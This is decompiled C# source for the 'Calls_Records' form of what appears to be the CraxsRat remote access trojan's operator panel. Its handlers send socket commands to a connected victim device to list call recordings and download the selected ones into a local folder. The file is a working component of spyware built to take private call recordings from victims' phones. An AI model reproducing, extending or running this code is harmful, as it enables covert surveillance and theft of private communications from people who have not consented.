using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x0200003E RID: 62
[DesignerGenerated]
public partial class Calls_Records : Form
{
	// Token: 0x060002BE RID: 702 RVA: 0x00049BD0 File Offset: 0x00047DD0
	public Calls_Records()
	{
		base.Load += this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsasdzxcf;
		base.FormClosing += this.Calls_Records_FormClosing;
		this.Title = "null";
		this.Client = new TcpClient();
		this.InitializeComponent();
	}

	// Token: 0x060002C1 RID: 705 RVA: 0x0004A808 File Offset: 0x00048A08
	public void Addrecord(object[] objs)
	{
		if (this.DataGridView1.InvokeRequired)
		{
			Calls_Records.AddNew method = new Calls_Records.AddNew(this.Addrecord);
			this.DataGridView1.Invoke(method, new object[]
			{
				objs
			});
		}
		else
		{
			try
			{
				int index = this.DataGridView1.Rows.Add(new object[]
				{
					objs[0],
					objs[1],
					objs[2],
					objs[3],
					objs[5]
				});
				DataGridViewRow dataGridViewRow = this.DataGridView1.Rows[index];
				dataGridViewRow.Tag = RuntimeHelpers.GetObjectValue(objs[6]);
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060002C2 RID: 706 RVA: 0x0000206C File Offset: 0x0000026C
	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
	}

	// Token: 0x060002C3 RID: 707 RVA: 0x0000206C File Offset: 0x0000026C
	private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
	{
	}

	// Token: 0x060002C4 RID: 708 RVA: 0x0000206C File Offset: 0x0000026C
	private void DrakeUIButtonIcon3_Click(object sender, EventArgs e)
	{
	}

	// Token: 0x060002C5 RID: 709 RVA: 0x0004A8B4 File Offset: 0x00048AB4
	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsasdzxcf(object sender, EventArgs e)
	{
		if (this.ClassClient != null)
		{
			string[] array = this.ClassClient.Keys.Split(new char[]
			{
				':'
			});
			object[] parametersObjects = new object[]
			{
				this.Client,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"GRC<*>T",
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.ClassClient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.ClassClient
			};
			this.ClassClient.SendMessage(parametersObjects);
			this.loadingbar.Enabled = true;
			this.loadingbar.Visible = true;
		}
	}

	// Token: 0x060002C6 RID: 710 RVA: 0x0004A9E0 File Offset: 0x00048BE0
	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsaercx(object sender, EventArgs e)
	{
		if (this.ClassClient != null)
		{
			if (this.DataGridView1.SelectedRows.Count > 0)
			{
				using (IEnumerator enumerator = this.DataGridView1.SelectedRows.GetEnumerator())
				{
					while (enumerator.MoveNext())
					{
						object obj = enumerator.Current;
						object objectValue = RuntimeHelpers.GetObjectValue(obj);
						string[] array = this.ClassClient.Keys.Split(new char[]
						{
							':'
						});
						int value = 0;
						int value2 = 0;
						if (NewLateBinding.LateGet(objectValue, null, "tag", new object[0], null, null, null) != null)
						{
							object[] parametersObjects = new object[]
							{
								this.ClassClient.myClient,
								Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(new string[]
								{
									SecurityKey.KeysClient2,
									Data.SPL_SOCKET,
									"gtrc<*>",
									NewLateBinding.LateGet(objectValue, null, "tag", new object[0], null, null, null).ToString(),
									"#"
								}), NewLateBinding.LateGet(objectValue, null, "tag", new object[0], null, null, null)), Data.SPL_SOCKET), array[0]), Data.SPL_SOCKET), array[1]), Data.SPL_SOCKET), SecurityKey.Lockscreen), Data.SPL_SOCKET), Conversions.ToString(value)), Data.SPL_SOCKET), Conversions.ToString(value2)), Data.SPL_SOCKET), Data.SPL_ARRAY), Data.SPL_SOCKET), this.ClassClient.ClientRemoteAddress),
								Codes.Encoding().GetBytes("null"),
								this.ClassClient
							};
							this.ClassClient.SendMessage(parametersObjects);
						}
					}
					return;
				}
			}
			Interaction.MsgBox("Select Record To Download!!!", MsgBoxStyle.MsgBoxHelp, null);
		}
	}

	// Token: 0x060002C7 RID: 711 RVA: 0x0004AC04 File Offset: 0x00048E04
	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatswfebcz(object sender, EventArgs e)
	{
		try
		{
			if (!Directory.Exists(this.DownloadsFolder + "\\Records"))
			{
				Directory.CreateDirectory(this.DownloadsFolder + "\\Records");
			}
			Process.Start(this.DownloadsFolder + "\\Records");
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x060002C8 RID: 712 RVA: 0x0004AC6C File Offset: 0x00048E6C
	private void Calls_Records_FormClosing(object sender, FormClosingEventArgs e)
	{
		try
		{
			this.loadingbar.Visible = false;
			this.loadingbar.Enabled = false;
			this.loadingbar.Dispose();
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x060002C9 RID: 713 RVA: 0x0004A8B4 File Offset: 0x00048AB4
	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsrhtsqw(object sender, EventArgs e)
	{
		if (this.ClassClient != null)
		{
			string[] array = this.ClassClient.Keys.Split(new char[]
			{
				':'
			});
			object[] parametersObjects = new object[]
			{
				this.Client,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"GRC<*>T",
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.ClassClient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.ClassClient
			};
			this.ClassClient.SendMessage(parametersObjects);
			this.loadingbar.Enabled = true;
			this.loadingbar.Visible = true;
		}
	}

	// Token: 0x04000343 RID: 835
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon4")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon4;

	// Token: 0x04000344 RID: 836
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon1")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon1;

	// Token: 0x04000345 RID: 837
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon2")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon2;

	// Token: 0x04000346 RID: 838
	public string Title;

	// Token: 0x04000347 RID: 839
	public Client ClassClient;

	// Token: 0x04000348 RID: 840
	public TcpClient Client;

	// Token: 0x04000349 RID: 841
	public string DownloadsFolder;

	// Token: 0x0200003F RID: 63
	// (Invoke) Token: 0x060002CB RID: 715
	public delegate void AddNew(object[] objs);
}
